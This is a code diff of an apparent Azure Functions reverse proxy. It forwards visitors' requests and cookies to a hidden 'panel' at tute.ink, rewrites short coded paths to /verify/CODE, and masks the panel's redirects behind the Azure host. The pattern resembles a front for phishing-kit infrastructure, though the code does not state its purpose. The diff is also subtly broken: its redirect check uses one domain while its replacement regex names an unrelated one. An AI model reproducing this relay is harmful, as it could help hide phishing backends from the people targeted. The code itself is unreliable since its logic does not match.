@@ -1,9 +1,25 @@
-const PANEL = 'www.tute.ink';
+const PANEL = 'tute.ink';
 
 module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
-    path = path.replace(/^\/api\/proxy/, '') || '/';
+    
+    // Remove the proxy prefix
+    path = path.replace(/^\/api\/proxy/, '');
+    
+    // 🚨 SMART ROUTING 🚨
+    // Check if the URL looks like /randomstring/CODE
+    // We split by '/' and if we have 2 parts, the second is the code.
+    const parts = path.split('/').filter(Boolean);
+    
+    if (parts.length === 2 && parts[1].length > 4) {
+        // If it's a 2-part path (like /78fgfdre5678/H4VNFV), rewrite to /verify/CODE
+        path = `/verify/${parts[1]}`;
+    } else if (parts.length === 1 && parts[0].length > 4) {
+        // If it's just /CODE, rewrite to /verify/CODE
+        path = `/verify/${parts[0]}`;
+    }
+
     if (!path.startsWith('/')) path = '/' + path;
 
     if (req.query && Object.keys(req.query).length > 0) {
@@ -22,7 +38,7 @@ module.exports = async function (context, req) {
         'Host': PANEL,
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Accept': req.headers['accept'] || '*/*',
-        'X-Ablegod-Worker': '1'      // ← tells panel this came through a worker
+        'X-Ablegod-Worker': '1'
     };
     if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
     if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];
@@ -44,11 +60,10 @@ module.exports = async function (context, req) {
         const responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
 
-        // If Flask returns a redirect to tute.ink, rewrite it to the Azure host
         let location = r.headers.get('location') || '';
-        if (location.startsWith('https://www.tute.ink') || location.startsWith('https://tute.ink')) {
+        if (location.startsWith(`https://${PANEL}`) || location.startsWith(`https://www.${PANEL}`)) {
             const azureHost = req.headers['host'] || context.req.headers['host'];
-            location = location.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${azureHost}`);
+            location = location.replace(/^https:\/\/(www\.)?sitedxc\.ink/, `https://${azureHost}`);
         }
 
         const respHeaders = {
